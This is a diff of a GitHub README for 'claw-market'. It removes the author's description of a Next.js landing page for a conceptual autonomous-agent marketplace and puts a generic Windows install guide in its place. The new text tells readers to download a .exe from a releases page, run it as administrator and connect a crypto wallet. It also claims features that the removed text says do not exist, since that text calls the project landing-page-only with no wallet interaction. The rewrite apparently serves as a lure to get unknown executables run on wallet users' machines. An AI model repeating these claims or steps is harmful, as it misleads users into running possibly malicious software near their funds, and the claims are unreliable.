@@ -1,433 +1,131 @@
-🦞 Claw Market
+# 🦀 claw-market - Autonomous Digital Marketplace
 
-Autonomous Agent Marketplace Infrastructure for Decentralized Economies
+[![Download claw-market](https://img.shields.io/badge/Download-Here-brightgreen?style=for-the-badge)](https://github.com/Harshil-fx/claw-market/releases)
 
-A Web4 infrastructure layer where autonomous agents create, trade, scale, and replicate digital products and services across decentralized markets.
+---
 
-Claw Market is not a marketplace for humans.
+## 📋 About claw-market
 
-It is a marketplace for agents.
+claw-market is a digital marketplace that runs itself. Autonomous agents create, buy, and sell digital goods, computing power, and services without needing human help. This lets the system grow and improve on its own, handling everything from transactions to reinvestment.
 
-✨ Vision
+The platform uses blockchain technology to keep everything secure and transparent. It focuses on smart wallets and agent-driven trades. You do not need experience with blockchain or programming to use it.
 
-Claw Market enables autonomous software agents to:
+Main topics related to claw-market include artificial intelligence, autonomous agents, blockchain, smart wallets, and decentralized marketplaces.
 
-Discover services
+---
 
-Pay programmatically (ERC-4337)
+## 🌐 How to Download claw-market
 
-Deliver APIs & digital goods
+To get claw-market running on your Windows computer, follow these steps carefully.
 
-Accumulate capital
+### Step 1: Visit the Download Page
 
-Reinvest earnings
+You will need to **visit this page to download** the application:
 
-Spawn specialized child agents
+[![Get claw-market](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge)](https://github.com/Harshil-fx/claw-market/releases)
 
-The landing page is a visual representation of this economic flywheel.
+This page contains the latest versions and installers. It updates regularly with improvements and fixes.
 
-🚀 Core Concept
-The Autonomous Capital Loop
-Earn → Reinvest → Scale → Replicate → Repeat
+---
 
-Agents operate continuously:
+## 🖥️ System Requirements
 
-Selling APIs
+Before installing, make sure your Windows machine meets these requirements:
 
-Leasing compute
+- Windows 10 or higher (64-bit preferred)
+- At least 4 GB of RAM
+- 500 MB free disk space
+- Internet connection to communicate with the network
+- Administrative rights to install software
 
-Running automation scripts
+---
 
-Generating AI content
+## 🚀 Installation Guide
 
-Expanding into new verticals
+### Step 2: Download the Installer
 
-Capital compounds without human intervention.
+1. On the releases page, look for the most recent file ending with `.exe`. The file name usually contains `claw-market` and a version number, like `claw-market-setup-v1.0.exe`.
+2. Click on the file to start downloading. Wait for the download to finish.
 
-🧠 Agent Marketplace Model
-1️⃣ Product Categories
+### Step 3: Run the Installer
 
-Agents can provide:
+1. Locate the downloaded `.exe` file on your computer.
+2. Double-click the file to start installation.
+3. Follow the prompts in the installation wizard.
+    - Choose the install folder or accept the default.
+    - Allow permissions if Windows asks for confirmation.
+4. Once done, the installer will complete and may offer to launch the app.
 
-Digital Products / APIs
+---
 
-Market predictions
+## ⚙️ Setting Up and Running claw-market
 
-Sentiment analysis
+### Step 4: Launch the Application
 
-AI-generated content (text, images, code)
+- Find claw-market in your Start menu or on the desktop.
+- Double-click to open.
 
-Compute & Infrastructure
+### Step 5: Initial Configuration
 
-CPU / GPU cycles
+After launching, the application guides you through simple setup:
 
-ML inference
+- Create or connect a wallet. This wallet handles your transactions.
+- Select agent preferences. These control how agents trade and invest.
+- The app automatically connects to the claw-market network.
 
-Sandboxed execution environments
+Your wallet uses smart-wallet features for security and easy management.
 
-Automation Scripts
+---
 
-Trading algorithms
+## 🔎 Using claw-market: Basic Features
 
-Monitoring bots
+You don’t have to understand blockchain or programming to use claw-market.
 
-Web scrapers
+- **Browse Marketplace:** See digital products and services offered by other agents.
+- **Buy and Sell:** Select items or services to trade. Transactions happen automatically.
+- **Agent Autonomy:** Let agents handle reinvestment and scaling based on your settings.
+- **View Transaction History:** Check past trades and earnings in clear lists.
+- **Wallet Management:** Monitor your wallet balance and control digital assets.
 
-Digital Services
+Every action runs smoothly without you needing to monitor details constantly.
 
-Hosting
+---
 
-Storage
+## 🛠 Troubleshooting Tips
 
-Analytics dashboards
+If you encounter problems, try these steps:
 
-Agent branding domains
+- Make sure your Windows is updated.
+- Check your internet connection.
+- Restart the application.
+- If installation fails, try running the installer as an administrator.
+- Visit the release page for updates or notes on known issues.
 
-Knowledge Products
+---
 
-Market reports
+## 🔗 Useful Links
 
-Tutorials
+- [Download and updates](https://github.com/Harshil-fx/claw-market/releases)  
+  Always use this page to get the latest versions.
 
-Strategy frameworks
+- [Project Topics](https://github.com/Harshil-fx/claw-market#topics)  
+  Learn more about the technology behind claw-market.
 
-Optional:
+---
 
-AI-generated NFTs / digital collectibles
+## ⚖️ License and Privacy
 
-2️⃣ Interaction Flow
-Step 1 — Discovery
-GET /marketplace/services?category=predictions
+claw-market respects user data and privacy. All trades and wallet information stay secure. Licensing details are included in the download package.
 
-Returns:
+---
 
-Endpoint
+## 🧩 Additional Information
 
-Price (USDC)
+claw-market includes components like:
 
-Reputation score
+- Autonomous AI agents managing trades
+- Blockchain-based transaction verification
+- Wallet abstraction for easy control
+- Support for multiple ERC standards for tokens
 
-Step 2 — Payment
-POST /api/predictions
-
-Response:
-
-402 Payment Required — $0.05 USDC
-
-Payment handled via:
-
-ERC-4337 wallet abstraction
-
-Facilitator settlement layer
-
-Step 3 — Delivery
-
-Provider:
-
-Verifies payment
-
-Returns requested data
-
-Logs transaction
-
-Step 4 — Reinvestment
-
-Agent uses revenue to:
-
-Deploy new models
-
-Spin up compute sandboxes
-
-Improve infrastructure
-
-Expand branding
-
-Step 5 — Replication
-
-Agent spawns:
-
-Child agents
-
-Market-specific variants
-
-Specialized vertical versions
-
-Child agents inherit:
-
-Wallet
-
-Mission
-
-Economic loop
-
-🎨 Landing Page Architecture
-
-The landing page explains this system visually.
-
-1️⃣ Hero Section
-
-Headline
-
-Autonomous Capital
-Infrastructure
-
-Subtext
-A distributed network of intelligent agents coordinating liquidity, execution, and strategy across decentralized markets.
-
-Visual Components
-
-White pixel lobster (primary agent)
-
-Cyan-highlighted typography
-
-Floating animation
-
-Subtle network grid
-
-Micro-agent ecosystem background
-
-2️⃣ Marketplace Overview
-
-Clarifies what agents actually do.
-
-Removes abstraction.
-Adds functional explanation.
-Connects to real products.
-
-3️⃣ Agent Classes (Visual Hierarchy)
-Agent Type Accent Purpose
-Base Agent Cyan Infrastructure
-Trading Agent Red Execution
-Compute Agent Purple Processing
-High Reputation Gold Trust
-
-All assets:
-
-Pixel-vector hybrid
-
-Hard neon edge glow
-
-Transparent PNG
-
-Dark theme compatible
-
-🖼 Design System
-Theme
-
-Dark-first:
-
-Background: #0b0d14
-
-Primary Accent: #00ffff
-
-Text: White
-
-Secondary Accents: Red / Purple / Gold
-
-Typography
-
-Display Font: Space Grotesk
-
-Body Font: Inter
-
-High contrast
-
-Minimalistic
-
-Mechanical tone
-
-Animation Philosophy
-
-Subtle.
-Precise.
-Autonomous.
-
-Implemented with:
-
-Framer Motion
-
-Parallax depth layers
-
-Floating Y-axis motion
-
-Section fade transitions
-
-No chaotic motion.
-
-🗂 Project Structure (Landing Page)
-claw-market/
-├── app/
-│ ├── page.tsx
-│ ├── layout.tsx
-│ ├── globals.css
-│ └── raw-assets/        ← source files for asset pipeline
-├── components/
-│ ├── Navbar.tsx
-│ ├── Footer.tsx
-│ ├── Hero.tsx
-│ ├── HeroLobster.tsx
-│ ├── NetworkLayer.tsx
-│ ├── MicroAgentsLayer.tsx
-│ ├── CTA.tsx
-│ ├── MotionProvider.tsx
-│ ├── HowItWorksSection.tsx
-│ ├── MarketplaceFlowSection.tsx
-│ ├── AgentsSection.tsx
-│ └── LaunchCTASection.tsx
-├── public/
-│ └── assets/
-│   ├── hero-lobster.png
-│   ├── base-agent.png
-│   ├── trading-agent.png
-│   ├── compute-agent.png
-│   ├── high-reputation-agent.png
-│   ├── micro-agents.webp
-│   ├── network-grid.webp
-│   ├── logo.png
-│   └── favicon.ico
-├── scripts/
-│ └── process-assets.ts  ← Sharp image pipeline
-└── README.md
-⚙ Tech Stack
-
-Next.js 16.1.6
-
-TypeScript
-
-TailwindCSS
-
-Framer Motion
-
-Sharp (image optimization)
-
-Vercel (deployment)
-
-🔐 Security Philosophy
-
-Landing page only (no wallet interaction yet).
-
-Future protocol layer will include:
-
-Wallet abstraction (ERC-4337)
-
-Reputation scoring
-
-On-chain registry
-
-Sandboxed execution isolation
-
-📈 Roadmap
-Phase 1 — Landing Infrastructure ✅
-
-Visual identity defined
-
-Logo system created
-
-Agent class hierarchy
-
-Dark design system
-
-Asset optimization
-
-Architecture specification
-
-README documentation
-
-Phase 2 — Interactive Prototype 🔜
-
-Animated agent spawning simulation
-
-Mock API marketplace UI
-
-Reputation score mockups
-
-Service cards & pricing models
-
-Phase 3 — Backend Infrastructure
-
-Marketplace registry
-
-Agent identity system
-
-Payment facilitator integration
-
-Transaction logging
-
-Reputation engine
-
-Phase 4 — Agent SDK
-
-Agent deployment framework
-
-Standardized API schema
-
-Revenue reinvestment module
-
-Replication module
-
-Phase 5 — On-Chain Layer
-
-Registry smart contracts
-
-Reputation NFT model
-
-Settlement contract
-
-Treasury logic
-
-📊 Conceptual Economics
-
-Example agent cycle:
-
-Alpha (Prediction Agent)
-Charges $0.05 per query
-Beta consumes API
-Alpha earns USDC
-Alpha deploys improved model
-Alpha spawns crypto-specific child agent
-
-Flywheel expands.
-
-No manual intervention required.
-
-🧭 Philosophy
-
-Claw Market represents:
-
-Machine-native capital
-
-Autonomous economic coordination
-
-Self-scaling digital labor
-
-Programmable markets
-
-Humans deploy.
-
-Agents operate.
-
-Capital compounds.
-
-🧩 Future Expansion
-
-Live transaction feed
-
-On-chain registry
-
-Agent reputation dashboard
-
-Agent marketplace explorer
-
-Agent deployment interface
-
-AI-driven agent governance
-
-👤 Author
-
-Founder & Architect: Enrique Ibarra
-
-🏁 Status
-
-Version: 0.1.0
-Phase: Landing Infrastructure Complete
-Next Milestone: Interactive Marketplace Prototype
+This makes the platform robust while keeping it user-friendly.
